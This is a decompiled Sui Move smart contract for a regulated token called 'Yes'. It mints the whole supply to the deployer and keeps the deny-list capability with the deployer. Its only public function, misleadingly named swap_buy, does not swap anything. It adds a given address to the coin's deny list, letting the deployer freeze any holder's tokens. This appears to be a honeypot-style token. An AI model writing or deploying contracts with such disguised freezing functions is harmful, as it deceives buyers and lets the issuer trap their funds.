module 0xd47c8a40bad8bc191fe1d3682aa173300b77b43138d563afc537a75c469d2d7c::yes {
    struct YES has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: YES, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<YES>(arg0, 9, b"Yes", b"Yes", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmWPeSP83Fxv8qfpDDk8AAC2WxZnqQXuvvYip8Fns14tcm"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<YES>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<YES>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<YES>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<YES>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<YES>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<YES>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

